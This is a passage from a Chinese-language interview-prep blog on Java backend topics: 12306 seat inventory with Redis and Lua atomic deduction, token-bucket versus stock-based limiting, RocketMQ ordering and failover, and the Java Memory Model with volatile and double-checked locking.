<li>下单流程</li>
<li>库存落库</li>
</ol>
</li>
<li>如果 Redis 扣减失败（返回负数）：
<ol>
<li>回滚 Redis 值（或拒绝下单）</li>
</ol>
</li>
</ol>
<h3 id="✅-优点：-4">✅ 优点：</h3>
<ul>
<li>Redis 操作是内存级别，极快（百万 QPS）</li>
<li>DECR 原子性保证不会超扣</li>
<li>减轻数据库压力，适合爆发式流量</li>
</ul>
<h3 id="❌-缺点：-6">❌ 缺点：</h3>
<ul>
<li>数据与数据库最终一致性问题（消息丢失怎么办？）</li>
<li>双写操作（Redis 和 DB）逻辑复杂</li>
<li>Redis 宕机需要降级逻辑</li>
</ul>
<h2 id="✅-三、12306-自研高并发余票方案">✅ 三、12306 自研高并发余票方案</h2>
<h3 id="🧩-适用场景：-3">🧩 适用场景：</h3>
<ul>
<li>实时计算、强一致性、高并发</li>
<li>分布式查询、高度定制业务逻辑（如跨站点车票）</li>
</ul>
<h3 id="🎯-特殊之处：">🎯 特殊之处：</h3>
<ul>
<li>列车座位不仅是简单数量，而是“站段+座位”的二维矩阵 举例：A-B-C-D-E 五站，用户选的是 B→D，你要判断 B-D 区段是否被占用</li>
</ul>
<h3 id="🔁-流程说明：-3">🔁 流程说明：</h3>
<ol>
<li>用户搜索 B→D 区段余票</li>
<li>应用系统在 Redis 中维护类似结构：</li>
<li><code>Key: train:seat:K123_20240521 ``Value: bitmap/段图/哈希</code></li>
<li>每个座位标记其在各站段的占用情况</li>
<li>系统通过算法判断是否有可用座位：
<ol>
<li>取出所有座位的 B→D 段是否有空闲（无交叉）</li>
</ol>
</li>
<li>若有 → 锁定该座位（Redisson 分布式锁）</li>
<li>创建订单 → 数据库落单、异步更新 Redis 缓存</li>
<li>RocketMQ 做消息同步，最终写入 DB</li>
</ol>
<h3 id="✅-优点：-5">✅ 优点：</h3>
<ul>
<li>强一致（一个座位只能分配一次）</li>
<li>支持跨区段、多条件余票查询</li>
<li>高并发下准确高效</li>
</ul>
<h3 id="❌-缺点：-7">❌ 缺点：</h3>
<ul>
<li>实现复杂，依赖定制算法与分布式锁</li>
<li>数据维护成本较高，缓存策略、补偿机制要求高</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MWQ5MjJhYmU3ZGU1NTc0ZTc4ODEwNWRhZTc5OTUzYzdfeDlPVGN6eVQxNXBXRmJqb1dRNzRXSGJTWVVTdXI3WE5fVG9rZW46WHJnU2JIeXlRbzVEQkV4VkRIZmM0VGpLblNoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-三、12306-高并发余票方案（🚄专属）">✅ 三、12306 高并发余票方案（🚄专属）</h2>
<h3 id="✅-背景特殊性：">✅ 背景特殊性：</h3>
<p>列车不是“一个商品几个库存”，而是“一个车厢多个座位，每个座位有多个站段”：</p>
<p>举个例子：</p>
<ul>
<li>列车 K123，站点为 A-B-C-D-E；</li>
<li>乘客买的是 <strong>B→D</strong>；</li>
<li>系统要判断“有没有某个座位，其 <strong>B到D 区段是空的</strong>”。</li>
</ul>
<h3 id="✅-数据结构（Redis中）：">✅ 数据结构（Redis中）：</h3>
<p>每个座位用一个 bitmap 或哈希记录：</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">seat_</span><span class="number">1</span><span class="operator">:</span> <span class="punctuation">[</span><span class="variable">A</span><span class="operator">-</span><span class="variable">B</span><span class="operator">,</span> <span class="variable">B</span><span class="operator">-</span><span class="built_in">C</span><span class="operator">,</span> <span class="built_in">C</span><span class="operator">-</span><span class="built_in">D</span><span class="operator">,</span> <span class="built_in">D</span><span class="operator">-</span><span class="built_in">E</span><span class="punctuation">]</span> <span class="operator">=&gt;</span> <span class="punctuation">[</span><span class="number">1</span><span class="operator">,</span> <span class="number">0</span><span class="operator">,</span> <span class="number">0</span><span class="operator">,</span> <span class="number">1</span><span class="punctuation">]</span>   <span class="operator">//</span> 表示该座位在<span class="variable">A</span><span class="operator">-</span><span class="variable">B</span>、<span class="built_in">D</span><span class="operator">-</span><span class="built_in">E</span>已被占 <span class="operator">``</span><span class="type">seat_</span><span class="number">2</span><span class="operator">:</span> <span class="punctuation">[</span><span class="number">0</span><span class="operator">,</span> <span class="number">0</span><span class="operator">,</span> <span class="number">0</span><span class="operator">,</span> <span class="number">0</span><span class="punctuation">]</span>                         <span class="operator">//</span> 全空</span><br></pre></td></tr></table></figure>
<h3 id="✅-示例流程：">✅ 示例流程：</h3>
<ol>
<li>乘客请求买B→D票；</li>
<li>系统查 Redis，扫描所有座位是否有 <code>[B-C, C-D]</code> 块为空；</li>
<li>找到可用座位 seat_2；</li>
<li>尝试加分布式锁（如 Redisson 锁）锁 seat_2；</li>
<li>锁成功 → 修改 Redis 占用段图；</li>
<li>异步落库 → RocketMQ 发消息通知订单/余票变更；</li>
<li>若中途失败 → 回滚 Redis；</li>
</ol>
<h3 id="✅-优势：">✅ 优势：</h3>
<ul>
<li>多站段、多座位组合下仍然<strong>能保持强一致性</strong>；</li>
<li>Redis 支持高并发读取；</li>
<li>使用<strong>消息队列</strong> + <strong>延迟双写策略</strong>实现一致性。</li>
</ul>
<h2 id="令牌限流和令牌桶限流">令牌限流和令牌桶限流</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTU5NTY3MmYzYTJmNzg3OWQxZjA4M2FjNGUyNjBmOWFfalNMcDFlYTZGTHE2WUZqWW14RHIxS0xhNXBXM05heXFfVG9rZW46VFQwTmJLMW1RbzJqRVd4d1hCbGNKNEhyblBmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-你说的“令牌限流”：其实是-“库存令牌控制”">✅ 你说的“令牌限流”：其实是 <strong>“库存令牌控制”</strong></h2>
<p>你所说的逻辑是这样的：</p>
<ul>
<li>每一个“合法区间”有一个 Redis 中的库存值（如：济南西→杭州东 剩 23 张票）</li>
<li>每次购票请求会判断多个相关区间的库存是否都充足</li>
<li>然后再统一扣减令牌（库存数减1）</li>
<li>这是典型的 <strong>“限资源数量”</strong>，而不是限速</li>
</ul>
<p>这个做法本质上是：</p>
<blockquote>
<p><strong>用 Redis + 令牌机制模拟库存扣减，确保不会超卖资源。</strong></p>
</blockquote>
<p>它更像是：</p>
<blockquote>
<p>🔒 <strong>“库存型”限流，不是速率型限流</strong></p>
</blockquote>
<h2 id="✅-Token-Bucket（令牌桶）算法则是-“速率控制型限流”">✅ Token Bucket（令牌桶）算法则是 “速率控制型限流”</h2>
<h3 id="工作机制：">工作机制：</h3>
<ol>
<li>以固定速率（如每秒10个）往“桶”里放入令牌</li>
<li>每个请求必须先拿到一个令牌才能继续</li>
<li>如果桶空了，请求就被拒绝或等待</li>
<li>桶最多只能容纳 N 个令牌，允许<strong>短时间突发请求</strong></li>
</ol>
<h3 id="示例场景：">示例场景：</h3>
<ul>
<li>接口 QPS 限流（如每秒最多处理 100 个请求）</li>
<li>网关限流（如 Spring Cloud Gateway 限制 IP 每秒访问频率）</li>
<li>某个服务防止被高频刷请求</li>
</ul>
<h2 id="✅-总结一句话：-4">✅ 总结一句话：</h2>
<blockquote>
<p><strong>你说的“令牌限流”是“库存型限流”（防超卖），而“令牌桶限流”是“速率型限流”（防刷）。</strong></p>
</blockquote>
<h2 id="✅-举例区分理解：">✅ 举例区分理解：</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDg4N2Q4NzZkNmFmNDI0NDQ2MzZmZGE1NjU5ODVkMjdfcU1XMUtycUxCMW5tNnFBR0tvQmg3SnhYd1FFMzJlbm5fVG9rZW46TGdYTGJMUndSbzAxd3l4ZDJTMWNWTXdKbnVTXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="12306或类似高并发购票系统中防止余票超卖的一种核心做法"><strong>12306或类似高并发购票系统中防止余票超卖的一种核心做法</strong></h3>
<p>即：</p>
<h2 id="✅-“基于-Redis-的令牌容器-Lua-脚本控制的库存型限流”方案">✅ “基于 Redis 的令牌容器 + Lua 脚本控制的库存型限流”方案</h2>
<p>下面我来用通俗、准确的方式，梳理你说的内容，方便你总结成面试答题话术或系统设计说明。</p>
<h3 id="🧩-一、问题背景：高并发场景下如何防止余票超卖？">🧩 一、问题背景：高并发场景下如何防止余票超卖？</h3>
<p>以 G35 列车为例，有多个站点，北京南 → 济南西 → 南京南 → 杭州东 → 宁波。 每一张车票其实占用的是：<strong>一个区间段（如 济南西→杭州东）上的座位资源</strong>。</p>
<p>在高并发下，如果用户抢票时不做好限流和库存控制，会导致：</p>
<ul>
<li>重复扣库存</li>
<li>并发写错 Redis / 数据库</li>
<li>座位超卖、订单失败、甚至数据不一致</li>
</ul>
<h3 id="🧠-二、核心思路：引入“令牌容器”做库存令牌控制">🧠 二、核心思路：引入“令牌容器”做库存令牌控制</h3>
<h4 id="✅-令牌容器是一个-Redis-Hash-结构，结构如下：">✅ 令牌容器是一个 Redis Hash 结构，结构如下：</h4>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">HKEY</span>: <span class="variable constant_">G35</span><span class="symbol">:</span><span class="number">20240520</span><span class="symbol">:YZ</span> <span class="string">``</span><span class="title class_">Field</span>（<span class="title class_">Key</span>）                         <span class="title class_">Value</span> <span class="string">``</span>---------------------------------------------------- <span class="string">``</span><span class="string">&quot;JinanXi-HangzhouDong&quot;</span>                <span class="number">23</span> <span class="string">``</span><span class="string">&quot;JinanXi-NanjingNan&quot;</span>                  <span class="number">28</span> <span class="string">``</span><span class="string">&quot;NanjingNan-HangzhouDong&quot;</span>             <span class="number">30</span> <span class="string">``</span><span class="string">&quot;BeijingNan-HangzhouDong&quot;</span>            <span class="number">25</span> <span class="string">``</span>...</span><br></pre></td></tr></table></figure>
<p>每个字段的含义：</p>
<ul>
<li>HashKey：代表某列车+日期+座位类型</li>
<li>HashField：代表某个【站点区间】</li>
<li>Value：代表这个站点区间上，剩余可售的座位数量</li>
</ul>
<h3 id="🛠️-三、购票流程分为几个步骤：">🛠️ 三、购票流程分为几个步骤：</h3>
<h4 id="✅-1-查询所需区间对应的所有相关冲突区间（如购买-济南西-→-杭州东）">✅ 1. 查询所需区间对应的所有相关冲突区间（如购买 济南西 → 杭州东）</h4>
<ul>
<li>要判断是否能买，必须判断所有可能与之冲突的区间都还有票</li>
<li>可能冲突的区间：北京南→杭州东、济南西→南京南、南京南→杭州东 等</li>
</ul>
<h4 id="✅-2-查询-Redis-中这些字段的值是否都-≥-1">✅ 2. 查询 Redis 中这些字段的值是否都 ≥ 1</h4>
<ul>
<li>如果任一字段为 0，说明该区间已售完，不能买票</li>
</ul>
<h4 id="✅-3-使用-Lua-脚本做原子性扣减">✅ 3. 使用 Lua 脚本做原子性扣减</h4>
<ul>
<li>使用 Lua 将这些字段 <strong>批量检查 + 扣减</strong>（原子操作）</li>
<li>如果中间任何一个字段不足，则整个扣减失败</li>
<li>这样就避免了“部分扣成功”的超卖问题</li>
</ul>
<h4 id="✅-4-成功扣减后进入下游流程">✅ 4. 成功扣减后进入下游流程</h4>
<ul>
<li>分配具体的座位号</li>
<li>将座位状态标记为“锁定”</li>
<li>创建订单、异步通知等</li>
</ul>
<h3 id="📌-最后总结一段话，作为面试标准答题语：">📌 最后总结一段话，作为面试标准答题语：</h3>
<blockquote>
<p>在我们系统中，为防止12306类似场景的座位超卖问题，我们采用了一种“库存型令牌限流算法”。核心逻辑是：用 Redis Hash 存储每个列车+日期+区间的剩余票数，当用户请求购票时，先识别所有冲突区间，统一使用 Lua 脚本判断并原子扣减这些字段。如果扣减成功，进入下游流程（座位锁定+创建订单），否则快速返回。这种方式既可以快速过滤无效请求，又能保障库存一致性，且具备极高的并发性能。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDAwZDMzMzdmZDM1ZjJhYjg0MGYzYjkyMGM3NTU3MDBfOFdhQjBMMGNJSjVWYnB0ZEp1YWVtRmg2MW9hV0p1QmpfVG9rZW46V2g3d2I1dDVyb1o4OHN4bHdwaGM1OGRVbjFnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTM1NWI0ODJmY2U2NGVjODRkODQwNGNlMzAxM2VjZGJfTGZrb3dvV0RMeGliUHZGSUQycHRIaWdleEY1VmRZRVhfVG9rZW46S3BiS2JnQ3B1bzI5M3F4eVp6YWNudG9UbkczXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OGJiYTQ0NjA1MjQ1YTk0OWNlOWM4YjM5NWM3M2VkY2VfSWlsRk9qQkI0V2ttVVVjMGV6ekcwOFU2c0g1V0JlS2RfVG9rZW46TnhEeGJtc3hXb1FlYVZ4Y0t3S2NoeTNObkpnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="RocketMQ-的顺序性">RocketMQ 的顺序性</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFmMWFhYWZkMTdmMmNlOTMwYzFjOWRlZjQ4NjZkMzJfZTR2dWtYaU56R3BpbGhubGtCTWwydDFRblpGaTNaWEtfVG9rZW46RjlzWGJaOEZXbzR1aml4MTIzSGN2d2dCbmFjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MGNlNTlhZGNlNThhOTYzODY5YmNmODA0NGNiMDg0YmRfdDRJTWxxek9ieEp4d0dFMEk5MThqRzhZR3FXY2ZuMklfVG9rZW46RndaemJyQzdsbzcxS3l4TmlJS2NpMllMblJxXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDIzZjAwNDQ4MzQ5OTg0OGViZTM2YTYxNzc3MGJjY2VfeUJPTkp3cGlROWxhNHo0cG9mdE1tdTFiY2JsTFYxRkhfVG9rZW46RUxQNWJoOG1ib3VXSUp4ZDYxVGNPaExFbjhiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-三、面试中标准答法（含扩展）">✅ 三、面试中标准答法（含扩展）</h2>
<h3 id="❓-面试官问：“RocketMQ-怎么保证顺序消费？”">❓ 面试官问：“RocketMQ 怎么保证顺序消费？”</h3>
<h3 id="✅-回答模板（简洁-技术点全）：">✅ 回答模板（简洁 + 技术点全）：</h3>
<blockquote>
<p>RocketMQ 顺序性分为生产顺序和消费顺序：</p>
<ul>
<li><strong>生产顺序</strong>：我们采用单一生产者 + 按业务字段（如订单 ID）进行队列分配，确保同一业务维度的消息进入同一个队列，并通过串行发送保障顺序；</li>
<li><strong>消费顺序</strong>：使用 <code>MessageListenerOrderly</code> 进行顺序消费，Broker 会将同一个队列中的消息<strong>一条一条投递</strong>，确保消息被串行处理，避免异步打乱顺序；</li>
<li>同时我们会<strong>限制最大重试次数</strong>，避免异常消息导致队列阻塞或顺序错乱。</li>
</ul>
</blockquote>
<h2 id="用户下单后异步扣库存的过程">用户下单后异步扣库存的过程</h2>
<h2 id="✅-场景：用户下单后异步扣库存（含-Broker-宕机应对）">✅ 场景：用户下单后异步扣库存（含 Broker 宕机应对）</h2>
<h3 id="💡-业务流程说明">💡 业务流程说明</h3>
<h4 id="1-用户下单成功">1. 用户下单成功</h4>
<blockquote>
<p>订单系统创建订单后，异步通知库存服务进行扣减：</p>
</blockquote>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">``</span>  <span class="string">&quot;orderId&quot;</span>: <span class="number">1001</span>, <span class="string">``</span>  <span class="string">&quot;sku&quot;</span>: <span class="string">&quot;123&quot;</span>, <span class="string">``</span>  <span class="string">&quot;qty&quot;</span>: <span class="number">2</span> <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="✅-正常流程">✅ 正常流程</h3>
<h4 id="Producer-发送消息：">Producer 发送消息：</h4>
<ol>
<li>订单系统向 RocketMQ 发送消息：
<ol>
<li>Topic: <code>stock_deduction_topic</code></li>
<li>Tag: <code>deduct</code></li>
<li>消息体：如上 JSON。</li>
</ol>
</li>
<li>Broker 存储消息到 <strong>CommitLog + ConsumeQueue</strong>。</li>
<li>库存服务 Consumer 监听 <code>stock_deduction_topic</code>：
<ol>
<li>拉取消息；</li>
<li>判断消息是否重复处理（幂等性校验）；</li>
<li>调用数据库/Redis 扣减库存；</li>
<li>消费成功后提交消费位点。</li>
</ol>
</li>
</ol>
<h3 id="✅-异常情况一：Consumer-异常">✅ 异常情况一：<strong>Consumer 异常</strong></h3>
<blockquote>
<p>库存服务宕机或执行报错</p>
</blockquote>
<ul>
<li>消息会被自动重试（默认最多 16 次）；</li>
<li>超过重试次数后 → 进入 <strong>死信队列（DLQ）</strong>；</li>
<li>需要人工排查并做补偿处理；</li>
<li>在实际项目中通常配合 <strong>钉钉/Prometheus 报警</strong>。</li>
</ul>
<h2 id="✅-面试答题模板（推荐背诵版）">✅ 面试答题模板（推荐背诵版）</h2>
<blockquote>
<p>这个问题面试官经常问：“如果 RocketMQ 的 Broker 宕了，消息还在吗？”</p>
</blockquote>
<p><strong>标准答法</strong>：</p>
<blockquote>
<p>RocketMQ 采用主备 Broker 架构，当主 Broker 宕机时，客户端可通过 NameServer 感知变化，自动将消息发送到备 Broker，避免数据丢失。同时，Producer 内部具备重试机制，支持多 Broker 路由尝试。</p>
<p>我们也可以开启 <code>syncFlush</code> 与 <code>SYNC_MASTER</code> 模式，提高消息的可靠写入能力。消费端同样支持消费位点管理与重试机制，确保消息处理成功或进入死信队列。整体保证了消息在生产、投递和消费过程的高可用性与顺序性。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NWRkMzQwYzQzZDQxNGY1OTQ5YTkxYzhkM2Y5Njg1ODlfZjNteHhiN0Zod1ZUdHlTSm9obHVLTUlBYzdtdzVYdjBfVG9rZW46TkZsMWJyeEo1b0NnOTV4R2t2bmNFMnkwblpjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>牛客</h1>
<h2 id="JVM内存模型JMM">JVM内存模型JMM</h2>
<p>JVM 内存模型（Java Memory Model，JMM）的核心是：</p>
<blockquote>
<p><strong>在多线程环境下，规定了各线程如何共享变量、如何保证原子性/可见性/有序性，以及这些语义如何在 JVM 层面落实。</strong></p>
</blockquote>
<p>它<strong>不是 JVM 内部堆/栈等结构的分区</strong>，而是一个<strong>抽象规范</strong>，用于屏蔽底层硬件差异，让 Java 多线程代码在不同平台上都能实现<strong>一致且正确的并发语义</strong>。</p>
<h2 id="🔍-通俗理解">🔍 通俗理解</h2>
<p>你可以把 <strong>JMM</strong> 想成一个**“并发通信协议”**，规定了：</p>
<ol>
<li><strong>主内存</strong>（Main Memory）：存储所有共享变量（类比于内存中的一块区域）；</li>
<li><strong>每个线程的工作内存</strong>（Working Memory）：每个线程自己的一份副本，用来读写变量；</li>
<li><strong>线程之间通信</strong>必须通过主内存——不能直接操作其他线程的数据。</li>
</ol>
<p>举个比喻：</p>
<blockquote>
<p>多个线程 = 多个员工 主内存 = 办公区的共享文档柜 工作内存 = 每人桌上的复印件 员工修改自己桌上的复印件，最终需要“同步”回共享文档柜，其他员工才能看到。</p>
</blockquote>
<h2 id="🧱-JMM-解决了什么问题？">🧱 JMM 解决了什么问题？</h2>
<h3 id="✅-1-可见性">✅ 1. 可见性</h3>
<p>一个线程对共享变量的修改，<strong>对另一个线程是否立即可见</strong>？</p>
<p>👉 比如：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">boolean</span> flag = <span class="literal">false</span>; <span class="string">``</span><span class="keyword">Thread</span> A: <span class="string">``</span>  flag = <span class="literal">true</span>; <span class="string">``</span><span class="keyword">Thread</span> B:<span class="keyword">while</span> (!flag) &#123;<span class="comment">// 会不会死循环？` `  &#125;</span></span><br></pre></td></tr></table></figure>
<p>如果没有 JMM 规定的“可见性”保障，<strong>Thread B 可能永远看不到 flag 改变</strong>，陷入死循环。</p>
<h3 id="✅-2-原子性">✅ 2. 原子性</h3>
<p>一个操作是否不可中断？</p>
<p>👉 比如：</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">i</span><span class="literal">++</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>并不是原子操作，而是：</p>
<ol>
<li>读取 i；</li>
<li>自增；</li>
<li>写回 i；</li>
</ol>
<p>多个线程同时执行就可能出现线程安全问题（丢失更新）。</p>
<h3 id="✅-3-有序性">✅ 3. 有序性</h3>
<p>Java 编译器 &amp; CPU 会进行指令重排，JMM 允许一定程度的重排，但保证<strong>重排不会影响单线程语义</strong>，并通过 <code>happens-before</code> 规则定义“什么不能被重排”。</p>
<h2 id="🧭-总结一句话：">🧭 总结一句话：</h2>
<blockquote>
<p><strong>JMM 是 Java 并发编程的理论基础</strong>，它不关心对象如何分配在堆/栈/方法区，而关心在并发执行中，<strong>线程如何安全地共享变量、保证执行顺序与可见性。</strong></p>
</blockquote>
<p>很好，我们就针对你提到的这个经典例子来彻底讲清楚：</p>
<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 共享变量 <span class="string">``</span>boolean flag = <span class="literal">false</span>; <span class="string">` `</span>// 线程 A<span class="string">` `</span>flag = <span class="literal">true</span>; <span class="string">` `</span>// 线程 B <span class="string">``</span><span class="keyword">while</span> (!flag) &#123;// <span class="keyword">do</span> <span class="literal">nothing</span><span class="string">` `</span>&#125; <span class="string">``</span>System.out.println(<span class="string">&quot;跳出循环&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="❗-问题是：B线程到底会不会跳出循环？">❗ 问题是：<strong>B线程到底会不会跳出循环？</strong></h2>
<h3 id="✅-正确答案：">✅ 正确答案：</h3>
<blockquote>
<p><strong>如果</strong> <strong><code>flag</code></strong> <strong>没有被</strong> <strong><code>volatile</code></strong> <strong>修饰，线程 B 有可能永远不会跳出循环！</strong></p>
</blockquote>
<h3 id="🤯-为什么？">🤯 为什么？</h3>
<p>在 JVM 内存模型下：</p>
<ul>
<li>每个线程会把共享变量的值<strong>拷贝到自己线程的“工作内存”（寄存器或缓存）中</strong>。</li>
<li>修改共享变量（如 A 把 <code>flag = true</code>）会先更新线程 A 自己的副本，然后<strong>再同步回主内存</strong>。</li>
<li>线程 B 在循环中可能一直使用自己缓存的 <code>flag</code> 副本值（仍为 <code>false</code>），<strong>而不是去主内存读取最新值</strong>。</li>
</ul>
<p>因此：</p>
<blockquote>
<p>没有同步机制的情况下，线程 B 永远看不到 <code>flag = true</code>，就会一直卡在循环里。</p>
</blockquote>
<h2 id="✅-正确写法（加-volatile-保证可见性）：">✅ 正确写法（加 volatile 保证可见性）：</h2>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">boolean</span> flag = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
<p>或者使用更强的同步手段：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">synchronized</span><span class="params">(lock)</span></span> &#123;<span class="comment">// 或用锁包围写/读 flag` `&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="💡-volatile-的作用总结：">💡 volatile 的作用总结：</h2>
<ul>
<li><strong>保证可见性</strong>：写操作会立刻刷新到主内存，读操作也会从主内存加载。</li>
<li><strong>禁止指令重排</strong>：避免代码执行顺序混乱。</li>
</ul>
<h2 id="🔄-补充：指令重排的风险场景（双重检查单例）">🔄 补充：指令重排的风险场景（双重检查单例）</h2>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 不安全写法 ``if (instance == null) &#123; ``   <span class="built_in"> instance </span>=<span class="built_in"> new </span>Singleton(); // 可能被重排` `&#125;</span><br></pre></td></tr></table></figure>
<p>这里对象可能“先分配内存后初始化”，另一个线程读到的是“半初始化对象”。这也是 JMM 关心的问题。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTg3NTE0ZGU5ODc0ODMyYWZjNzVlN2JlOTZkMTZmM2FfaG94WERkMHZzWnZmcVI3czAyeE1lWjdFOEtVbnRJMHpfVG9rZW46SmJCcGJUanhZb08wZkl4NTMyWmNJVExxbmJoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>**“指令重排导致双重检查锁单例不安全”**的这个问题，它正是 JVM 内存模型（JMM）中的一个关键案例。</p>
<h2 id="🔁-什么是指令重排（Instruction-Reordering）">🔁 什么是指令重排（Instruction Reordering）</h2>
<p>编译器 &amp; CPU 为了<strong>优化性能</strong>，会在不改变单线程语义的前提下<strong>改变指令的执行顺序</strong>。</p>
<p>但问题在于：</p>
<blockquote>
<p>在<strong>多线程</strong>场景下，这种“改变顺序”可能会让<strong>其他线程看到不完整或错误的状态</strong>，造成严重的并发 bug。</p>
</blockquote>
<h2 id="👇-举例：双重检查锁（DCL）写法（不安全版本）">👇 举例：双重检查锁（DCL）写法（不安全版本）</h2>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Singleton &#123;</span><br><span class="line">   <span class="keyword"> private</span><span class="keyword"> static</span> Singleton instance;</span><br><span class="line">   <span class="keyword"> public</span><span class="keyword"> static</span> Singleton getInstance() &#123;</span><br><span class="line">       <span class="built_in"> if </span>(instance == null) &#123;               // 第一次检查 ``            synchronized (Singleton.class) &#123;</span><br><span class="line">               <span class="built_in"> if </span>(instance == null) &#123;       // 第二次检查` `                   <span class="built_in"> instance </span>=<span class="built_in"> new </span>Singleton(); // 这里可能被重排序！` `                &#125; ``            &#125; ``        &#125;</span><br><span class="line">       <span class="built_in"> return </span>instance; ``    &#125; ``&#125;</span><br></pre></td></tr></table></figure>
<h2 id="⚠️-问题关键：instance-new-Singleton-可能会被重排序为以下三个步骤：">⚠️ 问题关键：<code>instance = new Singleton()</code> 可能会被<strong>重排序</strong>为以下三个步骤：</h2>
<ol>
<li><strong>分配内存</strong>：为对象分配内存空间</li>
<li><strong>初始化对象</strong>：调用构造方法初始化成员变量等</li>
<li><strong>设置引用</strong>：将对象引用赋值给 <code>instance</code> 变量</li>
</ol>
<h2 id="⚠️-重排后实际顺序可能是：">⚠️ 重排后实际顺序可能是：</h2>
<ol>
<li>分配内存</li>
<li>设置引用（<code>instance != null</code>！）</li>
<li>初始化对象</li>
</ol>
<h2 id="❌-线程-B-可能看到“未初始化”的对象！">❌ 线程 B 可能看到“未初始化”的对象！</h2>
<p>想象如下场景：</p>
<ul>
<li>线程 A 正在执行 <code>new Singleton()</code>，刚执行了第 1 步和第 2 步（分配内存 + 设置引用），<strong>还没初始化对象</strong>；</li>
<li>此时，线程 B 执行到 <code>if (instance != null)</code>，条件成立；</li>
<li>然后它拿着这个“半初始化”的对象去使用… 💥 崩溃！</li>
</ul>
<h2 id="✅-正确写法：加-volatile-禁止重排">✅ 正确写法：加 volatile 禁止重排</h2>
